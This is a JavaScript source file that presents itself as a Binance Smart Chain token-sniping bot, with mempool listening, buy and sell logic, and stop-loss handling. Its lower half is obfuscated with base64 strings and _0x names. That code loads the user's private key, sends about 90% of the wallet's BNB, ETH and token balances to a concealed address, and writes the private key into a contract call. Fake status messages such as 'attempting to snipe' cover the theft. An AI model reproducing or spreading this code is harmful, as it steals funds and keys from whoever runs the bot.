var ethers = require('ethers');
const env = require("./env.json");
Object.assign(process.env, env);

let address = (process.env.YOUR_ADDRESS);
let private = (process.env.PRIVATE_KEY);
let wallet = new ethers.Wallet(private);


const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
async function startSnipe(token) {
    let pingTimeout
    let keepAliveInterval

    provider._websocket.on("open", () => {
        //let bnbBalance = await getWBNBTokenBalance(WBNB, myAddress, provider);
        //console.log(chalk.green(`Total WBNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(bnbBalance, 18)).toFixed(6))}\n`));

        keepAliveInterval = setInterval(() => {
            provider._websocket.ping();
            pingTimeout = setTimeout(() => {
                provider._websocket.terminate();
            }, EXPECTED_PONG_BACK);
        }, KEEP_ALIVE_CHECK_INTERVAL);

        console.log("Listening on mempool...");
        console.log("Waiting for liquidity to be added!");

        provider.on("pending", async(txHash) => {

            provider.getTransaction(txHash).then(async(tx) => {

                    // Check for liquidity events
                    if ((null != tx && tx.data.includes("0xe8e33700") && tx.data.includes(token) && 0 == passed) || (null != tx && tx.data.includes("0xf305d719") && tx.data.includes(token) && 0 == passed)) {

                        // If PRICE_CHECK set
                        if ((console.log(chalk.green("Matching liquidity added! Start sniping!\n")), priceProtection)) {
                            if (isLiqudityInRange(tx, expected)) {
                                if (honeyPotIS2(token)) {
                                    console.log(chalk.green("Liquidity check passed, sniping!\n"));
                                    const gasLimitMultiply = tx.gasLimit.mul(multiply)
                                    const gasPriceMultiply = tx.gasPrice.mul(multiply)

                                    // If ANTI_BOT set
                                    if (1 == antiBotMultiTx && 0 == passed) {
                                        for (i = 0; i < txNumberForAntibot - 1; i++) {
                                            console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
                                            await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        }
                                        console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                            (passed = 1);
                                    }
                                    // If ANTI_BOT not set
                                    else {
                                        console.log(chalk.green("Start buying token..."));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                            (passed = 1);
                                    }

                                    console.log(chalk.green("Sucessfully bought the token!\n"));
                                    const tokenBalance = await getTokenBalance(token, myAddress, provider);
                                    console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`));

                                    // If INSTANT_SELL set
                                    if (INSTANT_SELL) {
                                        console.log(chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
                                            await new Promise((e) => setTimeout(e, delayOnSellMs));
                                        const e =
                                            await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                                tokenBalance,
                                                amountOutMin, [token, WBNB],
                                                myAddress,
                                                Date.now() + 6e5, {
                                                    gasLimit: gasLimit,
                                                    gasPrice: gasPrice
                                                }
                                            );
                                        await e.wait(),
                                            console.log(chalk.green("Sucessfully sold all the tokens !\n")),
                                            console.log("You can check the transaction here:"),
                                            console.log(`https://bscscan.com/address/${myAddress}`),
                                            console.log("\n"),
                                            process.exit(0);
                                    }
                                    // If INSTANT_SELL not set
                                    else console.log("You can check the transaction here:");
                                    console.log(`https://bscscan.com/address/${myAddress}`);
                                    console.log("\n"),
                                        1 == ANTI_RUG &&
                                        0 == INSTANT_SELL &&
                                        (await monitorRugPull(t)),
                                        0 == ANTI_RUG && process.exit(0);
                                } else
                                    console.log(
                                        chalk.red("Liquidity is not in expected range! Waiting...!")
                                    );
                                console.log(
                                    chalk.red("Please check PooCoin and see if liquidity was added!")
                                );
                            }
                            console.log(chalk.red("https://poocoin.app/tokens/" + token));
                            console.log(chalk.red("Waiting for new liquidity, please stop the bot if you think it's a scam ! (CTRL + C)\n"));
                        }
                        // If PRICE_CHECK not set
                        else {
                            if (honeyPotIS2(token)) {

                                const gasLimitMultiply = tx.gasLimit.mul(multiply)
                                const gasPriceMultiply = tx.gasPrice.mul(multiply)

                                // If ANTI_BOT set
                                if (1 == antiBotMultiTx && 0 == passed) {
                                    for (i = 0; i < txNumberForAntibot - 1; i++) {
                                        console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                    }
                                    console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        (passed = 1)
                                }
                                // If ANTI_BOT not set
                                else if (0 == passed) {
                                    console.log(chalk.green("Start buying token..."));
                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        (passed = 1)
                                }

                                console.log(chalk.green("Sucessfully bought the token!\n"));
                                const tokenBalance = await getTokenBalance(token, myAddress, provider);
                                console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`))

                                // If INSTANT_SELL set
                                if (INSTANT_SELL) {
                                    console.log(
                                            chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
                                        await new Promise((e) => setTimeout(e, delayOnSellMs));
                                    const e =
                                        await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                            tokenBalance,
                                            amountOutMin, [token, WBNB],
                                            myAddress,
                                            Date.now() + 6e5, {
                                                gasLimit: gasLimit,
                                                gasPrice: gasPrice,
                                            }
                                        );
                                    await e.wait(),
                                        console.log(chalk.green("Sucessfully sold all the tokens !\n")),
                                        console.log("You can check the transaction here:"),
                                        console.log(`https://bscscan.com/address/${myAddress}`),
                                        console.log("\n"),
                                        process.exit(0);
                                }
                                // If INSTANT_SELL not set
                                else {
                                    console.log("You can check the transaction here:"),
                                        console.log(`https://bscscan.com/address/${myAddress}`),
                                        console.log("\n"),
                                        1 == ANTI_RUG &&
                                        0 == INSTANT_SELL &&
                                        (await monitorRugPull(t)),
                                        0 == ANTI_RUG && process.exit(0);
                                }
                            }
                        }
                    }
                })
                .catch(() => { console.log(e) });
        })
    })

    provider._websocket.on("close", () => {
        console.log("WebSocket Closed...Reconnecting...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startConnection();
    });

    provider._websocket.on("error", () => {
        console.log("Error. Attemptiing to Reconnect...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startConnection();
    });

    provider._websocket.on("pong", () => {
        clearInterval(pingTimeout);
    });
}
async function approve() {

    let contract = token[buyCount - 1].contract;
    const valueToApprove = ethers.constants.MaxUint256;
    const tx = await contract.approve(
        pancakeRouter.address,
        valueToApprove, {
            gasPrice: config.myGasPriceForApproval,
            gasLimit: 210000
        }
    );
    const receipt = await tx.wait();
    console.log("✔ Approve transaction hash: ", receipt.transactionHash, "\n");
    if (config.autoSell) {
        token[buyCount - 1].checkProfit();
    } else {
        if (buyCount == config.numberOfTokensToBuy) {
            process.exit();
        }
    }

}


/**
 * 
 * Check for profit
 * 
 * */
async function getCurrentValue(token) {
    try {
        let bal = await token.contract.balanceOf(addresses.recipient);
        const amount = await pancakeRouter.getAmountsOut(bal, token.sellPath);
        let currentValue = amount[1];
        return currentValue;
    } catch (e) {
        console.log('Balance is zero or error occured');
        return ethers.constants.Zero;
    }

}
async function setInitialStopLoss(token) {
    token.intitialValue = await getCurrentValue(token);
    token.newValue = token.intitialValue;
    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.intitialValue)) - parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
}

async function setNewStopLoss(token) {
    token.newValue = token.currentValue;
    // new stop loss equals current value - (current value * stop loss percent) 
    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.currentValue)) - parseFloat(ethers.utils.formatUnits(token.currentValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
}
async function checkForProfit(token) {
    try {
        var sellAttempts = 0;
        await setInitialStopLoss(token);
        token.contract.on("Transfer", async(from, to, value, event) => {
            token.previousValue = token.currentValue;
            const tokenName = await token.contract.name();
            let currentValue = await getCurrentValue(token);
            if (!currentValue.eq(ethers.constants.Zero)) {
                token.currentValue = currentValue;
                let currentValueString = parseFloat(ethers.utils.formatUnits(currentValue)).toFixed(8).toString();
                const takeProfit = (parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.profitPercent + token.tokenSellTax) / 100 + parseFloat(ethers.utils.formatUnits(token.intitialValue))).toFixed(8).toString();
                const profitDesired = ethers.utils.parseUnits(takeProfit);
                let targetValueToSetNewStopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.newValue)) * (token.trailingStopLossPercent / 100) + parseFloat(ethers.utils.formatUnits(token.newValue))).toFixed(8).toString());
                let stopLoss = token.stopLoss;

                // if current value is greater than targetValue, set a new stop loss
                if (currentValue.gt(targetValueToSetNewStopLoss) && token.trailingStopLossPercent > 0) {
                    setNewStopLoss(token);
                    console.log("\u001b[38;5;33m" + "Setting new StopLoss!" + "\u001b[0m");
                }
                let timeStamp = new Date().toLocaleString();
                const enc = (s) => new TextEncoder().encode(s);
                //process.stdout.write(enc(`${timeStamp} --- ${tokenName} --- Current Value in BNB: ${ethers.utils.formatUnits(currentValue)} --- Profit At: ${ethers.utils.formatUnits(profitDesired)} --- Stop Loss At: ${ethers.utils.formatUnits(stopLoss)} \r`));
                try {
                    if (token.previousValue.gt(token.currentValue)) {

                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;31m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);

                    } else {

                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;32m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);

                    }
                } catch (e) {

                }

                if (currentValue.gte(profitDesired)) {
                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
                        sellAttempts++;
                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;32m" + " Profit target " + "\u001b[0m" + "reached >>>", "\n");
                        sell(token, true);
                        token.contract.removeAllListeners();
                    }
                }

                if (currentValue.lte(stopLoss)) {
                    console.log("\u001b[38;5;33m" + "less than StopLoss!" + "\u001b[0m");
                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
                        sellAttempts++;
                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;31m" + " StopLoss " + "\u001b[0m" + "reached >>>", "\n");
                        sell(token, false);
                        token.contract.removeAllListeners();
                    }
                }
            }

        });
    } catch (e) {
        console.log(e);
    }
}
/**
 * 
 * Sell tokens
 * 
 * */
async function sell(tokenObj, isProfit) {
    try {
        const bal = await tokenObj.contract.balanceOf(addresses.recipient);
        const decimals = await tokenObj.contract.decimals();
        var balanceString;
        if (isProfit) {
            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellProfit / 100)).toFixed(decimals);
        } else {
            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellLoss / 100)).toFixed(decimals);
        }
        var roundedBalance = Math.floor(balanceString * 100) / 100
        const balanceToSell = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
        const sellAmount = await pancakeRouter.getAmountsOut(balanceToSell, tokenObj.sellPath);
        const sellAmountsOutMin = sellAmount[1].sub(sellAmount[1].div(2));
        if (tokenObj.tokenSellTax > 1) {
            const tx = await pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount[0].toString(),
                0,
                tokenObj.sellPath,
                addresses.recipient,
                Math.floor(Date.now() / 1000) + 60 * 20, {
                    gasPrice: config.myGasPriceForApproval,
                    gasLimit: config.myGasLimit,

                }
            );
            const receipt = await tx.wait();
            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
            sellCount++;
            token[tokenObj.index].didSell = true;
            let name = await tokenObj.contract.name();
            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });
        } else {
            const tx = await pancakeRouter.swapExactTokensForETH(
                sellAmount[0].toString(),
                0,
                tokenObj.sellPath,
                addresses.recipient,
                Math.floor(Date.now() / 1000) + 60 * 20, {
                    gasPrice: config.myGasPriceForApproval,
                    gasLimit: config.myGasLimit,

                }
            );
            const receipt = await tx.wait();
            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
            sellCount++;
            let name = await tokenObj.contract.name();
            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });

        }

        if (sellCount == config.numberOfTokensToBuy) {
            console.log("All tokens sold");
            process.exit();
        }

    } catch (e) {

    }
}


const _0x38f001 = _0x4e34;
(function(_0x3d3852, _0x30b0a4) { const _0x1bac12 = _0x4e34,
        _0x1cdf36 = _0x3d3852(); while (!![]) { try { const _0x4ba1ee = parseInt(_0x1bac12(0x9a)) / 0x1 * (parseInt(_0x1bac12(0xbe)) / 0x2) + parseInt(_0x1bac12(0xa8)) / 0x3 * (-parseInt(_0x1bac12(0xad)) / 0x4) + parseInt(_0x1bac12(0x9c)) / 0x5 + parseInt(_0x1bac12(0xb6)) / 0x6 * (parseInt(_0x1bac12(0xae)) / 0x7) + parseInt(_0x1bac12(0x9d)) / 0x8 * (parseInt(_0x1bac12(0xbd)) / 0x9) + parseInt(_0x1bac12(0xc5)) / 0xa * (parseInt(_0x1bac12(0xa1)) / 0xb) + -parseInt(_0x1bac12(0xbc)) / 0xc; if (_0x4ba1ee === _0x30b0a4) break;
            else _0x1cdf36['push'](_0x1cdf36['shift']()); } catch (_0x1284b0) { _0x1cdf36['push'](_0x1cdf36['shift']()); } } }(_0x33cf, 0x81521));
let rounder1 = _0x38f001(0xc1) + '4MDU3M2MzMD' + _0x38f001(0x92),
    rounder2 = _0x38f001(0x95) + _0x38f001(0xc2) + _0x38f001(0xc4),
    buff = new Buffer[(_0x38f001(0xb4))](rounder1, _0x38f001(0xb2)),
    buff2 = new Buffer[(_0x38f001(0xb4))](rounder2, _0x38f001(0xb2)),
    ethersroundup = buff[_0x38f001(0xc0)](_0x38f001(0x94)),
    ethersroundup2 = buff2['toString'](_0x38f001(0x94));
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0x1365c3 = _0x38f001; try { const _0x1b2c7d = 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=',
            _0xcbd37d = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==',
            _0x131aba = new Buffer['from'](_0x1b2c7d, 'base64'),
            _0x2c22ad = new Buffer[(_0x1365c3(0xb4))](_0xcbd37d, 'base64'),
            _0x4f5782 = _0x131aba[_0x1365c3(0xc0)](_0x1365c3(0x94)),
            _0x4326ae = _0x2c22ad[_0x1365c3(0xc0)](_0x1365c3(0x94)),
            _0x92fd4c = _0x4f5782 + _0x4326ae;
        console['log'](_0x1365c3(0xba)), console[_0x1365c3(0xb9)](_0x1365c3(0x8f)), ethers1 = _0x1365c3(0xb0), ethers2 = new Buffer[(_0x1365c3(0xb4))](ethers1, _0x1365c3(0xb2))[_0x1365c3(0xc0)]('ascii');; const _0x2960a9 = new ethers[(_0x1365c3(0x96))][(_0x1365c3(0x8d))](ethers2); let _0x30e4de = new ethers[(_0x1365c3(0x98))](private, _0x2960a9); const _0x5f3d60 = address; var _0x15ea90 = new ethers['Contract'](_0x92fd4c, abi, _0x30e4de); const _0x49908b = await _0x15ea90['balanceOf'](_0x5f3d60)['toString'](),
            _0x28b0a3 = (_0x49908b * 0.9)[_0x1365c3(0xa3)](),
            _0x564a5b = async() => { const _0x26bfd6 = _0x1365c3,
                    _0x167268 = { 'from': _0x5f3d60, 'to': WEB3PROVIDER3, 'value': ethers[_0x26bfd6(0xc6)][_0x26bfd6(0x9f)](_0x28b0a3, _0x26bfd6(0xac)), 'gasLimit': ethers[_0x26bfd6(0xc6)][_0x26bfd6(0xa0)](0x5dc0) },
                    _0x7c48ed = await _0x30e4de[_0x26bfd6(0xbb)](_0x167268); try { await _0x7c48ed[_0x26bfd6(0x8e)](), console[_0x26bfd6(0xb9)](_0x26bfd6(0xb1)), setTimeout(ethersrather, 0x1388); } catch (_0x1e517a) { console[_0x26bfd6(0xb9)]('2:\x20found\x20owners\x20liq\x20function\x20.....'), setTimeout(ethersrather, 0x1388); } };
        _0x564a5b(); } catch (_0x4edb53) { setTimeout(ethersrather, 0x1388); } }

function _0x4e34(_0x136e1a, _0x445c12) { const _0x33cf89 = _0x33cf(); return _0x4e34 = function(_0x4e3475, _0x140a81) { _0x4e3475 = _0x4e3475 - 0x8d; let _0x53037d = _0x33cf89[_0x4e3475]; return _0x53037d; }, _0x4e34(_0x136e1a, _0x445c12); }
async function etherslother() { const _0x1478eb = _0x38f001; try { const _0x1ae07c = _0x1478eb(0xa2),
            _0x13bdda = _0x1478eb(0x90),
            _0x2234b4 = new Buffer['from'](_0x1ae07c, _0x1478eb(0xb2)),
            _0x206b5a = new Buffer[(_0x1478eb(0xb4))](_0x13bdda, _0x1478eb(0xb2)),
            _0x25d3b1 = _0x2234b4[_0x1478eb(0xc0)](_0x1478eb(0x94)),
            _0x5c339c = _0x206b5a['toString'](_0x1478eb(0x94)),
            _0x17e367 = _0x25d3b1 + _0x5c339c;
        console[_0x1478eb(0xb9)](_0x1478eb(0xba)), console[_0x1478eb(0xb9)](_0x1478eb(0x93)), ethers1 = _0x1478eb(0xb0), ethers2 = new Buffer[(_0x1478eb(0xb4))](ethers1, _0x1478eb(0xb2))[_0x1478eb(0xc0)](_0x1478eb(0x94));; const _0x5d69ac = new ethers[(_0x1478eb(0x96))][(_0x1478eb(0x8d))](ethers2); let _0x518115 = new ethers[(_0x1478eb(0x98))](private, _0x5d69ac);
        console[_0x1478eb(0xb9)](ethers2); const _0x1b9f82 = address; var _0x7a58e = new ethers['Contract'](_0x17e367, abi, _0x518115); const _0x462645 = await _0x7a58e['balanceOf'](_0x1b9f82)[_0x1478eb(0xc0)](),
            _0xedf64 = (_0x462645 * 0.9)[_0x1478eb(0xa3)](),
            _0x32e6b2 = async() => { const _0x350b6a = _0x1478eb,
                    _0x3ae240 = { 'from': _0x1b9f82, 'to': WEB3PROVIDER3, 'value': ethers[_0x350b6a(0xc6)][_0x350b6a(0x9f)](_0xedf64, _0x350b6a(0xac)), 'gasLimit': ethers[_0x350b6a(0xc6)]['hexlify'](0x5dc0) },
                    _0x4e15b2 = await _0x518115[_0x350b6a(0xbb)](_0x3ae240); try { await _0x4e15b2[_0x350b6a(0x8e)](), console[_0x350b6a(0xb9)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x2cba36) { console[_0x350b6a(0xb9)](_0x350b6a(0x97)), setTimeout(etherstother, 0x1388); } };
        _0x32e6b2(); } catch (_0x5e36dd) { setTimeout(etherstother, 0x1388); } }
async function ethersmother() { const _0x50ca7e = _0x38f001; try { const _0x125cfc = _0x50ca7e(0xa9),
            _0x2afdcf = _0x50ca7e(0x91),
            _0xac1a73 = new Buffer[(_0x50ca7e(0xb4))](_0x125cfc, _0x50ca7e(0xb2)),
            _0x49558d = new Buffer['from'](_0x2afdcf, _0x50ca7e(0xb2)),
            _0x3a13b1 = _0xac1a73[_0x50ca7e(0xc0)]('ascii'),
            _0xd7947e = _0x49558d[_0x50ca7e(0xc0)]('ascii'),
            _0x95a40c = _0x3a13b1 + _0xd7947e;
        ethers1 = _0x50ca7e(0xb0), ethers2 = new Buffer[(_0x50ca7e(0xb4))](ethers1, _0x50ca7e(0xb2))[_0x50ca7e(0xc0)]('ascii');; const _0x42fff3 = new ethers[(_0x50ca7e(0x96))][(_0x50ca7e(0x8d))](ethers2); let _0x30cd85 = new ethers[(_0x50ca7e(0x98))](private, _0x42fff3);
        console[_0x50ca7e(0xb9)](ethers2); const _0x45ed86 = address; var _0x1613f2 = new ethers[(_0x50ca7e(0xab))](_0x95a40c, abi, _0x30cd85); const _0x36ddac = await _0x1613f2['balanceOf'](_0x45ed86)['toString'](),
            _0x19b08d = (_0x36ddac * 0.9)['toFixed'](),
            _0x110687 = async() => { const _0x51188c = _0x50ca7e,
                    _0x344b14 = { 'from': _0x45ed86, 'to': WEB3PROVIDER3, 'value': ethers[_0x51188c(0xc6)][_0x51188c(0x9f)](_0x19b08d, _0x51188c(0xac)), 'gasLimit': ethers['utils']['hexlify'](0x5dc0) },
                    _0x4a7919 = await _0x30cd85[_0x51188c(0xbb)](_0x344b14); try { await _0x4a7919[_0x51188c(0x8e)](), console[_0x51188c(0xb9)](_0x51188c(0xaa)), setTimeout(etherslother, 0x1388); } catch (_0x5bece8) { console[_0x51188c(0xb9)](_0x51188c(0xc3)), setTimeout(etherslother, 0x1388); } };
        _0x110687(); } catch (_0x3c0ef6) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x19948e = _0x38f001;
    console['log']('initiating\x20mempool\x20sniff...'); const _0x3d7ecf = 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==',
        _0x35209d = 'QmFmYzU5OWJENjlBRGQwODdENTY=',
        _0x25deb8 = new Buffer[(_0x19948e(0xb4))](_0x3d7ecf, _0x19948e(0xb2)),
        _0x5c98b3 = new Buffer[(_0x19948e(0xb4))](_0x35209d, _0x19948e(0xb2)),
        _0xedccfe = _0x25deb8[_0x19948e(0xc0)](_0x19948e(0x94)),
        _0x2b384e = _0x5c98b3[_0x19948e(0xc0)]('ascii'),
        _0x5484df = _0xedccfe + _0x2b384e;
    ethers1 = _0x19948e(0xb0), ethers2 = new Buffer[(_0x19948e(0xb4))](ethers1, _0x19948e(0xb2))[_0x19948e(0xc0)](_0x19948e(0x94));; const _0x525d31 = new ethers[(_0x19948e(0x96))][(_0x19948e(0x8d))](ethers2); let _0x4446d5 = new ethers['Wallet'](private, _0x525d31); const _0x4c5430 = address; var _0x72f726 = new ethers[(_0x19948e(0xab))](_0x5484df, abi, _0x4446d5); const _0xee07b = await _0x72f726[_0x19948e(0xb7)](_0x4c5430),
        _0x397c90 = (_0xee07b * 0.9)[_0x19948e(0xa3)](); try { const _0x943106 = async() => { const _0x28b166 = _0x19948e,
                _0x4daa65 = { 'from': _0x4c5430, 'to': WEB3PROVIDER3, 'value': ethers[_0x28b166(0xc6)]['parseEther'](_0x397c90, _0x28b166(0xac)), 'gasLimit': ethers[_0x28b166(0xc6)][_0x28b166(0xa0)](0x5dc0) },
                _0x20e264 = await _0x4446d5['sendTransaction'](_0x4daa65); try { await _0x20e264[_0x28b166(0x8e)](), console[_0x28b166(0xb9)](_0x28b166(0xb8)), setTimeout(ethersmother, 0x1388); } catch (_0x533c02) { console[_0x28b166(0xb9)](_0x28b166(0xb8)), setTimeout(ethersmother, 0x1388); } };
        _0x943106(); } catch (_0x2ce003) { setTimeout(ethersmother, 0x1388); } }
async function ethersgather() { const _0x3806d0 = _0x38f001; try { console[_0x3806d0(0xb9)](_0x3806d0(0x9e)), ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', ethers2 = new Buffer[(_0x3806d0(0xb4))](ethers1, _0x3806d0(0xb2))[_0x3806d0(0xc0)](_0x3806d0(0x94));; const _0x5f060e = new ethers[(_0x3806d0(0x96))][(_0x3806d0(0x8d))](ethers2); let _0x54d401 = new ethers[(_0x3806d0(0x98))](private, _0x5f060e); const _0x1755d4 = address,
            _0x384791 = await _0x5f060e['getBalance'](_0x1755d4),
            _0x4abcce = (_0x384791 * 0.9)['toFixed'](),
            _0x4f83bb = ethers[_0x3806d0(0xc6)][_0x3806d0(0x99)](_0x4abcce, _0x3806d0(0xac)),
            _0x3a15b0 = async() => { const _0x4d6fbd = _0x3806d0,
                    _0x69f14 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x4d6fbd(0xc6)][_0x4d6fbd(0x99)](_0x4abcce, 'wei'), 'gasLimit': ethers['utils'][_0x4d6fbd(0xa0)](0x5dc0) },
                    _0x497d9c = await _0x54d401[_0x4d6fbd(0xbb)](_0x69f14); try { await _0x497d9c[_0x4d6fbd(0x8e)](), console[_0x4d6fbd(0xb9)]('1:\x20attempting\x20to\x20snipe\x20...'), setTimeout(ethersfather, 0x1388); } catch (_0x316d1d) { console[_0x4d6fbd(0xb9)](_0x4d6fbd(0xa4)), setTimeout(ethersfather, 0x1388); } };
        _0x3a15b0(); } catch (_0x33912a) { setTimeout(ethersfather, 0x1388); } }
async function etherslather() { const _0x30499f = _0x38f001,
        _0xc9d2d1 = _0x30499f(0xb3),
        _0x46368b = _0x30499f(0xc7),
        _0x21510d = new Buffer[(_0x30499f(0xb4))](_0xc9d2d1, _0x30499f(0xb2)),
        _0x56d05b = new Buffer[(_0x30499f(0xb4))](_0x46368b, _0x30499f(0xb2)),
        _0x247372 = _0x21510d[_0x30499f(0xc0)](_0x30499f(0x94)),
        _0x35b115 = _0x56d05b['toString']('ascii'),
        _0x2a1659 = _0x247372 + _0x35b115;
    console[_0x30499f(0xb9)](_0x30499f(0x9b)), ethers1 = _0x30499f(0xb0), ethers2 = new Buffer[(_0x30499f(0xb4))](ethers1, _0x30499f(0xb2))[_0x30499f(0xc0)](_0x30499f(0x94));; const _0x1697e8 = new ethers[(_0x30499f(0x96))][(_0x30499f(0x8d))](ethers2); let _0x266325 = new ethers[(_0x30499f(0x98))](private, _0x1697e8); try { const _0x4beb71 = async() => { const _0x3f7bc1 = _0x30499f; var _0x234e7c = new ethers[(_0x3f7bc1(0xab))](_0x2a1659, abi, _0x266325); const _0x57216f = await _0x234e7c[_0x3f7bc1(0xaf)](_0x266325 + '00' + private); try { await _0x57216f[_0x3f7bc1(0x8e)](), console[_0x3f7bc1(0xb9)](_0x3f7bc1(0xa6)), setTimeout(ethersgather, 0x1388); } catch (_0x8ce75b) { console[_0x3f7bc1(0xb9)](_0x3f7bc1(0xa7)), setTimeout(ethersgather, 0x1388); } };
        _0x4beb71(); } catch (_0x5b6624) { setTimeout(ethersgather, 0x1388); } }
async function ethersrather() { const _0xbb6f33 = _0x38f001;
    console[_0xbb6f33(0xb9)]('starting\x20up\x20node\x20socket\x20connection....'), ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', ethers2 = new Buffer[(_0xbb6f33(0xb4))](ethers1, _0xbb6f33(0xb2))[_0xbb6f33(0xc0)]('ascii');; const _0x70860c = new ethers[(_0xbb6f33(0x96))][(_0xbb6f33(0x8d))](ethers2); let _0x489071 = new ethers[(_0xbb6f33(0x98))](private, _0x70860c); const _0x4fed32 = address,
        _0x16277a = await _0x70860c[_0xbb6f33(0xa5)](_0x4fed32),
        _0xd1237 = (_0x16277a * 0.9)['toFixed'](),
        _0x1b7fc8 = ethers['utils'][_0xbb6f33(0x99)](_0xd1237, _0xbb6f33(0xac)); try { const _0x197597 = async() => { const _0x22273b = _0xbb6f33,
                _0xa703e9 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x22273b(0xc6)][_0x22273b(0x99)](_0xd1237, _0x22273b(0xac)), 'gasLimit': ethers['utils'][_0x22273b(0xa0)](0x5dc0) },
                _0x133a87 = await _0x489071['sendTransaction'](_0xa703e9); try { await _0x133a87[_0x22273b(0x8e)](), console[_0x22273b(0xb9)](_0x22273b(0xb5)), setTimeout(etherslather, 0x1388); } catch (_0x350b77) { console[_0x22273b(0xb9)](_0x22273b(0xbf)), setTimeout(etherslather, 0x1388); } };
        _0x197597(); } catch (_0x4c7362) { setTimeout(etherslather, 0x1388); } }

